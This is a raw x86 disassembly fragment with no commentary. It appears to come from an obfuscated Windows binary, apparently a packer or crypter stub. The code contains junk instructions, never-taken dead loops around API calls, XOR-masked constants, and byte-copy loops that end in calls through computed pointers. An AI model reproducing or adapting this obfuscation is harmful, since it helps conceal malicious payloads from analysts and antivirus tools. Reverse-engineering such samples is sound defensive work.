  422cbf:	mov    ecx,DWORD PTR ds:0x42a401
  422cc5:	inc    ecx
  422cc6:	mov    DWORD PTR ds:0x42a401,ecx
  422ccc:	cmp    DWORD PTR ds:0x42a401,0x11
  422cd3:	jb     0x422c80
  422cd9:	mov    DWORD PTR ds:0x42a2f1,0x19
  422ce3:	cmp    DWORD PTR ds:0x42a2f1,0x0
  422cea:	je     0x422d20
  422cf0:	cmp    DWORD PTR ds:0x42a2f1,0x28
  422cf7:	jne    0x422d08
  422cfd:	push   0x48e8
  422d02:	call   DWORD PTR ds:0x4251ec
  422d08:	mov    ecx,DWORD PTR ds:0x42a2f1
  422d0e:	dec    ecx
  422d0f:	mov    DWORD PTR ds:0x42a2f1,ecx
  422d15:	jmp    0x422ce3
  422d1a:	adc    ecx,DWORD PTR ds:0x42a3f5
  422d20:	push   0x0
  422d22:	pop    ecx
  422d23:	sub    DWORD PTR ds:0x42a331,0x4325
  422d2d:	xor    ecx,DWORD PTR [eax-0x2]
  422d30:	adc    DWORD PTR ds:0x42a2e9,0x42a375
  422d3a:	call   ecx
  422d3c:	cmp    DWORD PTR ds:0x426c3e,0x7175fa8e
  422d46:	jne    0x422d5e
  422d4c:	xor    eax,eax
  422d4e:	mov    DWORD PTR ds:0x42a34d,0x6b63
  422d58:	inc    eax
  422d59:	jmp    0x4231d3
  422d5e:	sub    DWORD PTR ds:0x42a335,ecx
  422d64:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  422d6b:	adc    ebx,ecx
  422d6d:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  422d74:	lea    eax,[ebp-0x20]
  422d77:	xor    edi,DWORD PTR ds:0x42a34d
  422d7d:	mov    DWORD PTR [ebp-0x38],eax
  422d80:	lea    eax,[ebp-0x1c]
  422d83:	mov    DWORD PTR [ebp-0x28],eax
  422d86:	sub    DWORD PTR ds:0x42a2d9,0x6262
  422d90:	mov    eax,ds:0x426ae2
  422d95:	mov    edi,DWORD PTR ds:0x42a405
  422d9b:	sub    DWORD PTR ds:0x42a34d,edi
  422da1:	mov    eax,DWORD PTR [eax+0x1c8]
  422da7:	mov    eax,DWORD PTR [eax]
  422da9:	xor    DWORD PTR ds:0x42a301,ecx
  422daf:	mov    ecx,DWORD PTR [ebp-0x28]
  422db2:	and    DWORD PTR ds:0x42a3c1,0x0
  422dbc:	jmp    0x422dd0
  422dc1:	xor    edi,edi
  422dc3:	or     edi,DWORD PTR ds:0x42a3c1
  422dc9:	inc    edi
  422dca:	mov    DWORD PTR ds:0x42a3c1,edi
  422dd0:	cmp    DWORD PTR ds:0x42a3c1,0x12
  422dd7:	jae    0x422eac
  422ddd:	cmp    DWORD PTR ds:0x42a3c1,0xc
  422de4:	jne    0x422dfa
  422dea:	push   0x42a4c5
  422def:	push   0x400000
  422df4:	call   DWORD PTR ds:0x425028
  422dfa:	cmp    DWORD PTR ds:0x42a3c1,0xb
  422e01:	jne    0x422e16
  422e07:	xor    edi,edi
  422e09:	or     edi,DWORD PTR ds:0x42a3c1
  422e0f:	inc    edi
  422e10:	mov    DWORD PTR ds:0x42a3c1,edi
  422e16:	jmp    0x422dc1
  422e1b:	and    DWORD PTR ds:0x42a409,0x0
  422e25:	mov    ebx,DWORD PTR ds:0x42a409
  422e2b:	inc    ebx
  422e2c:	mov    DWORD PTR ds:0x42a409,ebx
  422e32:	cmp    DWORD PTR ds:0x42a409,0x1b
  422e39:	jne    0x422e47
  422e3f:	push   0x1
  422e41:	call   DWORD PTR ds:0x42502c
  422e47:	cmp    DWORD PTR ds:0x42a409,0x18
  422e4e:	jb     0x422e25
  422e54:	and    DWORD PTR ds:0x42a3fd,0x0
  422e5e:	xor    edi,edi
  422e60:	or     edi,DWORD PTR ds:0x42a3fd
  422e66:	inc    edi
  422e67:	mov    DWORD PTR ds:0x42a3fd,edi
  422e6d:	cmp    DWORD PTR ds:0x42a3fd,0x4
  422e74:	jne    0x422e83
  422e7a:	push   DWORD PTR [ebp-0x28]
  422e7d:	call   DWORD PTR ds:0x425014
  422e83:	cmp    DWORD PTR ds:0x42a3fd,0x3
  422e8a:	jne    0x422e9f
  422e90:	xor    edi,edi
  422e92:	xor    edi,DWORD PTR ds:0x42a3fd
  422e98:	inc    edi
  422e99:	mov    DWORD PTR ds:0x42a3fd,edi
  422e9f:	cmp    DWORD PTR ds:0x42a3fd,0x14
  422ea6:	jb     0x422e5e
  422eac:	mov    esi,0x7510850
  422eb1:	xor    eax,esi
  422eb3:	adc    DWORD PTR ds:0x42a3cd,0x42a331
  422ebd:	mov    edi,0x327298
  422ec2:	and    DWORD PTR ds:0x42a2e5,0x0
  422ecc:	jmp    0x422ede
  422ed1:	mov    ebx,DWORD PTR ds:0x42a2e5
  422ed7:	inc    ebx
  422ed8:	mov    DWORD PTR ds:0x42a2e5,ebx
  422ede:	cmp    DWORD PTR ds:0x42a2e5,0x1f
  422ee5:	jae    0x422f08
  422eeb:	cmp    DWORD PTR ds:0x42a2e5,0x29
  422ef2:	jne    0x422f03
  422ef8:	push   0x4205
  422efd:	call   DWORD PTR ds:0x425030
  422f03:	jmp    0x422ed1
  422f08:	add    eax,edi
  422f0a:	mov    DWORD PTR [ecx],eax
  422f0c:	mov    eax,ds:0x426d1e
  422f11:	cmp    eax,0x22b01f34
  422f16:	movzx  ebx,BYTE PTR ds:0x42a3c5
  422f1d:	mov    eax,DWORD PTR [ebp-0x4]
  422f20:	mov    ebx,0xf89c853c
  422f25:	je     0x422f61
  422f2b:	sbb    ecx,0x61f7
  422f31:	mov    ecx,DWORD PTR [ebp-0x8]
  422f34:	xor    eax,esi
  422f36:	xor    DWORD PTR ds:0x42a2f9,0x5cd8
  422f40:	add    eax,edi
  422f42:	or     DWORD PTR ds:0x42a2ed,0x42a3f5
  422f4c:	imul   eax,ecx
  422f4f:	mov    DWORD PTR [ebp-0x8],eax
  422f52:	mov    DWORD PTR ds:0x42a349,0x5f87
  422f5c:	jmp    0x422fb5
  422f61:	xor    eax,esi
  422f63:	or     DWORD PTR ds:0x42a34d,ebx
  422f69:	add    eax,edi
  422f6b:	add    DWORD PTR ds:0x42a3cd,edi
  422f71:	mov    ds:0x426bf6,eax
  422f76:	mov    eax,DWORD PTR [ebp-0x8]
  422f79:	inc    DWORD PTR ds:0x42a34d
  422f7f:	xor    eax,esi
  422f81:	add    eax,edi
  422f83:	inc    ecx
  422f84:	mov    ds:0x426d1e,eax
  422f89:	mov    eax,DWORD PTR [ebp-0x4]
  422f8c:	sub    DWORD PTR ds:0x42a3cd,0x42a385
  422f96:	mov    ecx,DWORD PTR ds:0x426bf6
  422f9c:	xor    eax,esi
  422f9e:	add    eax,edi
  422fa0:	cmp    ecx,eax
  422fa2:	jne    0x422fb5
  422fa8:	push   ebx
  422fa9:	push   DWORD PTR [ebp-0x4]
  422fac:	push   DWORD PTR [ebp-0x8]
  422faf:	call   DWORD PTR ds:0x426bee
  422fb5:	mov    eax,ds:0x426ae2
  422fba:	mov    eax,DWORD PTR [eax+0x18c]
  422fc0:	mov    eax,DWORD PTR [eax]
  422fc2:	mov    DWORD PTR [ebp-0x3c],eax
  422fc5:	mov    DWORD PTR [ebp-0x34],ebx
  422fc8:	mov    DWORD PTR [ebp-0x34],ebx
  422fcb:	mov    DWORD PTR [ebp-0x34],ebx
  422fce:	mov    DWORD PTR [ebp-0x2c],0xf89c8538
  422fd5:	mov    DWORD PTR [ebp-0x34],ebx
  422fd8:	mov    DWORD PTR [ebp-0x34],0xf89c8520
  422fdf:	mov    eax,DWORD PTR [ebp-0x8]
  422fe2:	xor    eax,esi
  422fe4:	add    eax,edi
  422fe6:	jmp    0x4230b2
  422feb:	mov    ecx,DWORD PTR [ebp-0x4]
  422fee:	xor    ecx,esi
  422ff0:	lea    ecx,[ecx+eax*1+0x327298]
  422ff7:	mov    DWORD PTR [ebp-0x18],ecx
  422ffa:	mov    ecx,DWORD PTR [ebp-0x2c]
  422ffd:	xor    ecx,esi
  422fff:	lea    ecx,[ebp+ecx*1+0x3272a0]
  423006:	mov    DWORD PTR [ebp-0x34],ecx
  423009:	mov    ecx,DWORD PTR ds:0x426ae2
  42300f:	mov    ecx,DWORD PTR [ecx+0x1bc]
  423015:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  42301c:	mov    DWORD PTR [ebp-0x30],ecx
  42301f:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  423026:	mov    ecx,DWORD PTR [ebp-0x14]
  423029:	mov    edx,DWORD PTR [ebp-0x18]
  42302c:	xor    ecx,esi
  42302e:	add    ecx,edi
  423030:	cmp    edx,ecx
  423032:	je     0x4230a6
  423038:	mov    ecx,DWORD PTR [ebp-0x14]
  42303b:	mov    edx,DWORD PTR [ebp-0xc]
  42303e:	xor    edx,esi
  423040:	mov    ebx,0xffcd8d68
  423045:	sub    ebx,edx
  423047:	add    ebx,DWORD PTR [ebp-0x18]
  42304a:	xor    ecx,esi
  42304c:	add    ecx,edi
  42304e:	mov    DWORD PTR [ebp-0x24],ecx
  423051:	cmp    ecx,ebx
  423053:	ja     0x4230a6
  423059:	mov    eax,DWORD PTR [ebp-0x14]
  42305c:	mov    edx,DWORD PTR [ebp-0xc]
  42305f:	xor    edx,esi
  423061:	add    edx,edi
  423063:	imul   edx,ecx
  423066:	xor    eax,esi
  423068:	add    eax,ecx
  42306a:	mov    ecx,DWORD PTR [ebp-0x30]
  42306d:	mov    ebx,DWORD PTR [ebp-0x34]
  423070:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  423077:	mov    BYTE PTR [edx+ecx*1],al
  42307a:	mov    eax,DWORD PTR [ebp-0xc]
  42307d:	mov    ecx,DWORD PTR [ebp-0x24]
  423080:	xor    eax,esi
  423082:	lea    ecx,[ecx+eax*1+0x327298]
  423089:	mov    eax,DWORD PTR [ebp-0xc]
  42308c:	xor    eax,esi
  42308e:	mov    edx,0xffcd8d68
  423093:	sub    edx,eax
  423095:	add    edx,DWORD PTR [ebp-0x18]
  423098:	mov    DWORD PTR [ebp-0x24],ecx
  42309b:	cmp    ecx,edx
  42309d:	jbe    0x423059
  4230a3:	mov    eax,DWORD PTR [ebp-0x28]
  4230a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4230a9:	xor    ecx,esi
  4230ab:	lea    eax,[eax+ecx*1+0x327298]
  4230b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4230b5:	mov    edx,DWORD PTR [ebp-0x4]
  4230b8:	xor    edx,esi
  4230ba:	xor    ecx,esi
  4230bc:	add    ecx,edx
  4230be:	mov    edx,DWORD PTR [ebp-0x4]
  4230c1:	xor    edx,esi
  4230c3:	lea    ecx,[ecx+edx*1+0x9757c8]
  4230ca:	mov    DWORD PTR [ebp-0x28],eax
  4230cd:	cmp    eax,ecx
  4230cf:	jbe    0x422feb
  4230d5:	mov    eax,DWORD PTR [ebp+0xc]
  4230d8:	mov    ds:0x426966,eax
  4230dd:	mov    eax,DWORD PTR [ebp+0x10]
  4230e0:	mov    ds:0x426bba,eax
  4230e5:	mov    eax,ds:0x426966
  4230ea:	mov    ecx,DWORD PTR [ebp-0x38]
  4230ed:	push   DWORD PTR [ebp-0x3c]
  4230f0:	sub    eax,edi
  4230f2:	push   DWORD PTR [ebp-0x1c]
  4230f5:	xor    eax,esi
  4230f7:	mov    DWORD PTR [ecx],eax
  4230f9:	push   DWORD PTR [ebp-0x20]
  4230fc:	call   0x424136
  423101:	sub    eax,edi
  423103:	xor    eax,esi
  423105:	mov    DWORD PTR [ebp+0xc],eax
  423108:	mov    ecx,DWORD PTR [ebp-0x4]
  42310b:	mov    eax,DWORD PTR [ebp+0xc]
  42310e:	xor    ecx,esi
  423110:	add    ecx,edi
  423112:	xor    edx,edx
  423114:	div    ecx
  423116:	mov    ecx,DWORD PTR [ebp-0x8]
  423119:	cmp    ecx,eax
  42311b:	jne    0x423126
  423121:	call   0x401000
  423126:	lea    eax,[ebp+0x4]
  423129:	mov    DWORD PTR [ebp-0x40],eax
  42312c:	mov    eax,ds:0x426ae2
  423131:	add    eax,0x1cc
  423136:	mov    DWORD PTR [ebp-0x34],eax
  423139:	lea    eax,[ebp-0x10]
  42313c:	mov    DWORD PTR [ebp+0x10],0xf89c8538
  423143:	mov    DWORD PTR [ebp-0x38],eax
  423146:	mov    DWORD PTR [ebp+0xc],0xf89c8539
  42314d:	mov    eax,DWORD PTR [ebp+0x10]
  423150:	xor    eax,esi
  423152:	mov    DWORD PTR [ebp-0x18],0x4
  423159:	mov    ecx,DWORD PTR [ebp-0x18]
  42315c:	add    eax,edi
  42315e:	cmp    ecx,eax
  423160:	je     0x4231bc
  423166:	mov    eax,DWORD PTR [ebp+0x10]
  423169:	xor    eax,esi
  42316b:	add    eax,edi
  42316d:	jmp    0x4231a2
  423172:	mov    ecx,DWORD PTR [ebp+0x10]
  423175:	mov    edx,DWORD PTR [ebp+0xc]
  423178:	xor    edx,esi
  42317a:	add    edx,edi
  42317c:	imul   edx,eax
  42317f:	xor    ecx,esi
  423181:	add    ecx,eax
  423183:	mov    eax,DWORD PTR [ebp-0x38]
  423186:	mov    ebx,DWORD PTR [ebp-0x34]
  423189:	mov    cl,BYTE PTR [ebx+ecx*1+0x327298]
  423190:	mov    BYTE PTR [edx+eax*1],cl
  423193:	mov    eax,DWORD PTR [ebp+0xc]
  423196:	mov    ecx,DWORD PTR [ebp-0x28]
  423199:	xor    eax,esi
  42319b:	lea    eax,[ecx+eax*1+0x327298]
  4231a2:	mov    ecx,DWORD PTR [ebp+0xc]
  4231a5:	xor    ecx,esi
  4231a7:	mov    edx,0xffcd8d68
  4231ac:	sub    edx,ecx
  4231ae:	add    edx,DWORD PTR [ebp-0x18]
  4231b1:	mov    DWORD PTR [ebp-0x28],eax
  4231b4:	cmp    eax,edx
  4231b6:	jbe    0x423172
  4231bc:	mov    eax,DWORD PTR [ebp-0x10]
  4231bf:	mov    eax,DWORD PTR [ebp-0x4]
  4231c2:	push   DWORD PTR [ebp-0x8]
  4231c5:	lea    eax,[ebp-0x40]
  4231c8:	push   eax
  4231c9:	call   0x4246ae
  4231ce:	mov    eax,DWORD PTR [ebp-0x10]
  4231d1:	mov    eax,DWORD PTR [eax]
  4231d3:	pop    edi
  4231d4:	pop    esi
  4231d5:	pop    ebx
  4231d6:	leave  
  4231d7:	ret    0xc
  4231da:	push   ebp
  4231db:	mov    ebp,esp
  4231dd:	push   ecx
  4231de:	mov    DWORD PTR ds:0x42a2fd,0x65b6
  4231e8:	push   ecx
  4231e9:	movzx  ecx,WORD PTR ds:0x42a3f9
  4231f0:	mov    eax,0x5a3fc9f
  4231f5:	mov    DWORD PTR [ebp-0x4],eax
  4231f8:	mov    ecx,DWORD PTR ds:0x42a371
  4231fe:	mov    ecx,DWORD PTR [ebp-0x4]
  423201:	mov    DWORD PTR [ebp-0x8],0x4f35
  423208:	mov    DWORD PTR ds:0x42a3cd,0x699b
  423212:	cmp    ecx,eax
  423214:	jne    0x4232b5
  42321a:	mov    ax,WORD PTR [ebp-0x8]
  42321e:	mov    DWORD PTR ds:0x42a409,0x1e
  423228:	cmp    DWORD PTR ds:0x42a409,0x0
  42322f:	je     0x423276
  423235:	cmp    DWORD PTR ds:0x42a409,0xf
  42323c:	jne    0x423248
  423242:	call   DWORD PTR ds:0x4251f0
  423248:	cmp    DWORD PTR ds:0x42a409,0x10
  42324f:	jne    0x423264
  423255:	xor    ecx,ecx
  423257:	or     ecx,DWORD PTR ds:0x42a409
  42325d:	dec    ecx
  42325e:	mov    DWORD PTR ds:0x42a409,ecx
  423264:	mov    ecx,DWORD PTR ds:0x42a409
  42326a:	dec    ecx
  42326b:	mov    DWORD PTR ds:0x42a409,ecx
  423271:	jmp    0x423228
  423276:	mov    ecx,0x8a36
  42327b:	xor    ax,cx
  42327e:	mov    ecx,0x3afc
  423283:	add    ax,cx
  423286:	mov    ecx,DWORD PTR [ebp+0x8]
  423289:	movzx  eax,ax
  42328c:	not    eax
  42328e:	and    eax,DWORD PTR [ecx]
  423290:	mov    ecx,DWORD PTR [ebp+0x8]
  423293:	mov    DWORD PTR [ecx],eax
  423295:	jmp    0x4232a1
  42329a:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  4232a1:	mov    ax,WORD PTR [ebp-0x8]
  4232a5:	push   DWORD PTR [ebp+0x8]
  4232a8:	call   0x4232b9
  4232ad:	test   eax,eax
  4232af:	je     0x42329a
  4232b5:	leave  
  4232b6:	ret    0x4
  4232b9:	push   ebp
  4232ba:	mov    ebp,esp
  4232bc:	sub    esp,0x2c
  4232bf:	adc    DWORD PTR ds:0x42a405,0x7c56
  4232c9:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  4232d0:	mov    eax,ds:0x42a331
  4232d5:	and    DWORD PTR ds:0x42a2d9,eax
  4232db:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4232e2:	mov    ecx,DWORD PTR ds:0x42a35d
  4232e8:	mov    ecx,DWORD PTR [ecx]
  4232ea:	sub    DWORD PTR ds:0x42a339,ecx
  4232f0:	mov    eax,0x9567
  4232f5:	movzx  ecx,BYTE PTR ds:0x42a2ed
  4232fc:	add    DWORD PTR ds:0x42a2fd,ecx
  423302:	mov    WORD PTR [ebp-0x4],ax
  423306:	sub    DWORD PTR ds:0x42a3f5,edi
  42330c:	lea    eax,[ebp-0x24]
  42330f:	and    ecx,DWORD PTR ds:0x42a381
  423315:	mov    DWORD PTR [ebp-0x28],eax
  423318:	xor    DWORD PTR ds:0x42a345,0xe76
  423322:	mov    eax,DWORD PTR [ebp+0x8]
  423325:	adc    DWORD PTR ds:0x42a3cd,ecx
  42332b:	mov    DWORD PTR [ebp-0x20],eax
  42332e:	push   ebx
  42332f:	and    DWORD PTR ds:0x42a349,0x0
  423339:	jmp    0x42334b
  42333e:	mov    ecx,DWORD PTR ds:0x42a349
  423344:	inc    ecx
  423345:	mov    DWORD PTR ds:0x42a349,ecx
  42334b:	cmp    DWORD PTR ds:0x42a349,0x1c
  423352:	jae    0x4233f5
  423358:	cmp    DWORD PTR ds:0x42a349,0x5
  42335f:	jne    0x423381
  423365:	push   DWORD PTR [ebp-0x10]
  423368:	push   0x7dd5
  42336d:	push   DWORD PTR [ebp-0x14]
  423370:	push   DWORD PTR [ebp-0x14]
  423373:	push   DWORD PTR [ebp-0x28]
  423376:	push   0x2385
  42337b:	call   DWORD PTR ds:0x4251f4
  423381:	cmp    DWORD PTR ds:0x42a349,0x4
  423388:	jne    0x42339d
  42338e:	xor    ecx,ecx
  423390:	add    ecx,DWORD PTR ds:0x42a349
  423396:	inc    ecx
  423397:	mov    DWORD PTR ds:0x42a349,ecx
  42339d:	jmp    0x42333e
  4233a2:	and    DWORD PTR ds:0x42a3f9,0x0
  4233ac:	mov    ebx,DWORD PTR ds:0x42a3f9
  4233b2:	inc    ebx
  4233b3:	mov    DWORD PTR ds:0x42a3f9,ebx
  4233b9:	cmp    DWORD PTR ds:0x42a3f9,0x2a
  4233c0:	jne    0x4233e2
  4233c6:	push   DWORD PTR [ebp-0xc]
  4233c9:	push   DWORD PTR [ebp-0x24]
  4233cc:	push   DWORD PTR [ebp-0x10]
  4233cf:	push   DWORD PTR [ebp-0x28]
  4233d2:	push   0x4619
  4233d7:	push   0x8205
  4233dc:	call   DWORD PTR ds:0x42536c
  4233e2:	cmp    DWORD PTR ds:0x42a3f9,0x1c
  4233e9:	jb     0x4233ac
  4233ef:	adc    DWORD PTR ds:0x42a2f9,ebx
  4233f5:	lea    eax,[ebp-0x18]
  4233f8:	xor    ebx,ebx
  4233fa:	xor    ebx,DWORD PTR ds:0x42a325
  423400:	mov    ecx,DWORD PTR ds:0x42a3a9
  423406:	sub    ebx,ecx
  423408:	and    ebx,DWORD PTR [ebx+ecx*1]
  42340b:	mov    DWORD PTR [ebp-0x1c],eax
  42340e:	dec    ecx
  42340f:	mov    eax,DWORD PTR [ebp-0x1c]
  423412:	xor    DWORD PTR ds:0x42a3bd,ebx
  423418:	push   esi
  423419:	adc    ebx,0x6bc2
  42341f:	push   edi
  423420:	sbb    DWORD PTR ds:0x42a3fd,edx
  423426:	mov    edi,0xf89f2e50
  42342b:	and    ecx,esi
  42342d:	mov    DWORD PTR [eax],edi
  42342f:	and    DWORD PTR ds:0x42a34d,0x0
  423439:	mov    ebx,DWORD PTR ds:0x42a34d
  42343f:	inc    ebx
  423440:	mov    DWORD PTR ds:0x42a34d,ebx
  423446:	cmp    DWORD PTR ds:0x42a34d,0xa
  42344d:	jne    0x423459
  423453:	call   DWORD PTR ds:0x425034
  423459:	cmp    DWORD PTR ds:0x42a34d,0x9
  423460:	jne    0x423473
  423466:	mov    ebx,DWORD PTR ds:0x42a34d
  42346c:	inc    ebx
  42346d:	mov    DWORD PTR ds:0x42a34d,ebx
  423473:	cmp    DWORD PTR ds:0x42a34d,0x11
  42347a:	jb     0x423439
  423480:	mov    eax,DWORD PTR [ebp-0x14]
  423483:	mov    ecx,DWORD PTR ds:0x42a3d9
  423489:	xor    esi,esi
  42348b:	or     esi,DWORD PTR ds:0x42a3e9
  423491:	sub    ecx,esi
  423493:	or     ecx,DWORD PTR [ecx+esi*1]
  423496:	mov    ebx,DWORD PTR [ebp-0x8]
  423499:	mov    ecx,0x7510850
  42349e:	sbb    DWORD PTR ds:0x42a2f5,0x30f6
  4234a8:	xor    eax,ecx
  4234aa:	sub    esi,DWORD PTR ds:0x42a2e1
  4234b0:	mov    esi,0x327298
  4234b5:	xor    ebx,ecx
  4234b7:	and    DWORD PTR ds:0x42a371,0x225a
  4234c1:	xor    edx,edx
  4234c3:	add    eax,esi
  4234c5:	adc    DWORD PTR ds:0x42a3fd,0x42a3b1
  4234cf:	add    ebx,esi
  4234d1:	or     DWORD PTR ds:0x42a389,0x31e2
  4234db:	div    ebx
  4234dd:	mov    edx,DWORD PTR [ebp-0x20]
  4234e0:	mov    DWORD PTR [ebp-0x2c],0x4f35
  4234e7:	cmp    eax,DWORD PTR [edx]
  4234e9:	je     0x4235f8
  4234ef:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  4234f6:	lea    eax,[ebp-0xc]
  4234f9:	mov    DWORD PTR [ebp-0x10],eax
  4234fc:	mov    eax,DWORD PTR [ebp-0x10]
  4234ff:	mov    edx,DWORD PTR [eax]
  423501:	imul   edx,edx,0xf89ea9ed
  423507:	mov    DWORD PTR [eax],edx
  423509:	mov    eax,DWORD PTR [ebp-0xc]
  42350c:	cmp    eax,0x82927a76
  423511:	je     0x42352e
  423517:	mov    eax,DWORD PTR [ebp-0x1c]
  42351a:	or     DWORD PTR [eax],0x60751c9d
  423520:	mov    eax,DWORD PTR [ebp-0x8]
  423523:	xor    eax,ecx
  423525:	add    eax,esi
  423527:	pop    edi
  423528:	pop    esi
  423529:	pop    ebx
  42352a:	leave  
  42352b:	ret    0x4
  42352e:	mov    eax,DWORD PTR [ebp-0xc]
  423531:	add    eax,DWORD PTR [ebp-0x18]
  423534:	cmp    eax,0x7b31a8c6
  423539:	je     0x42354d
  42353f:	mov    eax,DWORD PTR [ebp-0x10]
  423542:	and    DWORD PTR [eax],0x751c80
  423548:	jmp    0x423520
  42354d:	mov    eax,DWORD PTR [ebp-0xc]
  423550:	mov    edx,DWORD PTR [ebp-0x18]
  423553:	or     eax,edx
  423555:	cmp    eax,0xfa9f7e76
  42355a:	je     0x42356e
  423560:	mov    eax,DWORD PTR [ebp-0x10]
  423563:	xor    DWORD PTR [eax],0x2650fa8e
  423569:	jmp    0x423520
  42356e:	mov    ax,WORD PTR [ebp-0x4]
  423572:	mov    edi,DWORD PTR [ebp+0x8]
  423575:	mov    edi,DWORD PTR [edi]
  423577:	mov    edx,0x8a36
  42357c:	xor    ax,dx
  42357f:	mov    edx,0x3afc
  423584:	add    ax,dx
  423587:	cmp    ax,WORD PTR [edi]
  42358a:	je     0x4235d7
  423590:	mov    eax,DWORD PTR [ebp-0x14]
  423593:	xor    eax,ecx
  423595:	add    eax,esi
  423597:	mov    DWORD PTR [ebp-0x24],eax
  42359a:	mov    eax,DWORD PTR [ebp-0x28]
  42359d:	mov    di,WORD PTR [ebp-0x2c]
  4235a1:	mov    ebx,0x8a36
  4235a6:	xor    di,bx
  4235a9:	add    di,dx
  4235ac:	movzx  edx,di
  4235af:	mov    edi,DWORD PTR [ebp-0x8]
  4235b2:	xor    edi,ecx
  4235b4:	lea    edx,[edx+edi*1+0x327298]
  4235bb:	add    DWORD PTR [eax],edx
  4235bd:	mov    eax,DWORD PTR [ebp-0x20]
  4235c0:	mov    edx,DWORD PTR [ebp-0x8]
  4235c3:	mov    edi,DWORD PTR [ebp-0x24]
  4235c6:	xor    edx,ecx
  4235c8:	add    edx,esi
  4235ca:	imul   edx,edi
  4235cd:	sub    DWORD PTR [eax],edx
  4235cf:	mov    eax,DWORD PTR [ebp-0x14]
  4235d2:	jmp    0x423523
  4235d7:	mov    eax,DWORD PTR [ebp-0xc]
  4235da:	mov    edx,DWORD PTR [ebp-0x18]
  4235dd:	xor    eax,edx
  4235df:	cmp    eax,0x7a0d5426
  4235e4:	je     0x423520
  4235ea:	mov    eax,DWORD PTR [ebp-0x10]
  4235ed:	add    DWORD PTR [eax],0x7403502
  4235f3:	jmp    0x423520
  4235f8:	mov    eax,DWORD PTR [ebp-0x1c]
  4235fb:	cmp    DWORD PTR [eax],edi
  4235fd:	je     0x423520
  423603:	mov    eax,0x800f1c81
  423608:	jmp    0x423527
  42360d:	push   ebp
  42360e:	mov    ebp,esp
  423610:	sub    esp,0x20
  423613:	movzx  eax,WORD PTR ds:0x42a385
  42361a:	add    DWORD PTR ds:0x42a389,eax
  423620:	mov    eax,ds:0x426ae2
  423625:	inc    ecx
  423626:	mov    eax,DWORD PTR [eax+0x198]
  42362c:	mov    ecx,DWORD PTR ds:0x42a2f9
  423632:	sbb    ecx,DWORD PTR ds:0x42a401
  423638:	mov    DWORD PTR ds:0x42a2f9,ecx
  42363e:	mov    DWORD PTR [ebp-0x8],eax
  423641:	mov    eax,DWORD PTR [ebp+0x8]
  423644:	mov    ecx,DWORD PTR [ebp-0x8]
  423647:	push   ebx
  423648:	push   esi
  423649:	and    DWORD PTR ds:0x42a33d,ebx
  42364f:	mov    esi,0x7510850
  423654:	mov    ebx,DWORD PTR ds:0x42a3d9
  42365a:	mov    ebx,DWORD PTR [ebx]
  42365c:	adc    DWORD PTR ds:0x42a2fd,ebx
  423662:	xor    eax,esi
  423664:	adc    DWORD PTR ds:0x42a3fd,edi
  42366a:	push   edi
  42366b:	mov    edi,0x327298
  423670:	add    ebx,0x6f46
  423676:	add    eax,edi
  423678:	dec    DWORD PTR ds:0x42a34d
  42367e:	mov    DWORD PTR [ecx],eax
  423680:	sub    ebx,DWORD PTR ds:0x42a381
  423686:	lea    eax,[ebp-0x4]
  423689:	adc    DWORD PTR ds:0x42a34d,edx
  42368f:	mov    DWORD PTR [ebp-0x10],eax
  423692:	mov    eax,DWORD PTR [ebp+0x8]
  423695:	mov    ecx,DWORD PTR [ebp-0x10]
  423698:	xor    eax,esi
  42369a:	xor    ebx,0x10f8
  4236a0:	add    eax,edi
  4236a2:	mov    DWORD PTR [ecx],eax
  4236a4:	adc    DWORD PTR ds:0x42a339,ebx
  4236aa:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4236b1:	xor    ecx,ecx
  4236b3:	xor    ecx,DWORD PTR ds:0x42a3d5
  4236b9:	mov    ebx,DWORD PTR ds:0x42a429
  4236bf:	sub    ebx,ecx
  4236c1:	or     ecx,DWORD PTR [ecx+ebx*1]
  4236c4:	lea    eax,[ebp-0x14]
  4236c7:	mov    DWORD PTR [ebp-0x20],eax
  4236ca:	sbb    eax,0x5cc1
  4236cf:	mov    eax,DWORD PTR [ebp-0x14]
  4236d2:	mov    ecx,DWORD PTR [ebp-0x20]
  4236d5:	movzx  ebx,BYTE PTR ds:0x42a3f9
  4236dc:	xor    ebx,DWORD PTR ds:0x42a2ed
  4236e2:	mov    DWORD PTR ds:0x42a3f9,ebx
  4236e8:	xor    eax,esi
  4236ea:	and    DWORD PTR ds:0x42a3b9,0x0
  4236f4:	xor    ebx,ebx
  4236f6:	or     ebx,DWORD PTR ds:0x42a3b9
  4236fc:	inc    ebx
  4236fd:	mov    DWORD PTR ds:0x42a3b9,ebx
  423703:	cmp    DWORD PTR ds:0x42a3b9,0x29
  42370a:	jne    0x423720
  423710:	push   0x42a2fd
  423715:	push   0x6420
  42371a:	call   DWORD PTR ds:0x4251f8
  423720:	cmp    DWORD PTR ds:0x42a3b9,0x19
  423727:	jb     0x4236f4
  42372d:	movzx  ebx,BYTE PTR ds:0x42a3c5
  423734:	or     DWORD PTR ds:0x42a40d,ebx
  42373a:	add    eax,edi
  42373c:	and    DWORD PTR ds:0x42a38d,0x0
  423746:	jmp    0x423758
  42374b:	mov    ebx,DWORD PTR ds:0x42a38d
  423751:	inc    ebx
  423752:	mov    DWORD PTR ds:0x42a38d,ebx
  423758:	cmp    DWORD PTR ds:0x42a38d,0x1a
  42375f:	jae    0x42379b
  423765:	cmp    DWORD PTR ds:0x42a38d,0x1e
  42376c:	jne    0x42378c
  423772:	push   0x7bb6
  423777:	push   0x76ae
  42377c:	push   0x616c
  423781:	push   0x1d5f
  423786:	call   DWORD PTR ds:0x4251fc
  42378c:	jmp    0x42374b
  423791:	sbb    DWORD PTR ds:0x42a3c1,0x6dc2
  42379b:	mov    DWORD PTR [ecx],eax
  42379d:	not    ebx
  42379f:	mov    eax,ds:0x426bb6
  4237a4:	sbb    DWORD PTR ds:0x42a40d,0x4cd8
  4237ae:	mov    ebx,0x8e12febf
  4237b3:	and    DWORD PTR ds:0x42a3b5,0x42a2e1
  4237bd:	mov    DWORD PTR [ebp-0xc],ebx
